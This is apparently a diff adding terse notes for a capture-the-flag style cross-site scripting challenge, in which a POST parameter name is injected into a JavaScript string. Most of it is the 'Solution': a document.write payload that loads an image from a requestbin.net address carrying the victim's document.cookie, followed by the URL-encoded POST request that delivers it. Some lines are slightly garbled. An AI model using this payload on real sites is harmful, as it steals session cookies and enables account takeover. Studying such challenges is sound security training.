@@ -1,0 +1,15 @@
+POST /
+content[test]=value
+
+302 redirect to XXS->
+const note = ""test":"value"";
+
+const note = ""+test+":"+"";
+
+
+Solution: 
+
+document.write(`<img src="http://requestbin.net/r/1ffs0ee2?${encodeURIComponent(document.cookie)}"/>`)
+
+POST /
+content[%2Bdocument.write(%60%3Cimg%20src%3D%22http%3A%2F%2Frequestbin.net%2Fr%2F1ffs0ee2%3F%24%7BencodeURIComponent(document.cookie)%7D%22%2F%3E%60)%2B]=%2B
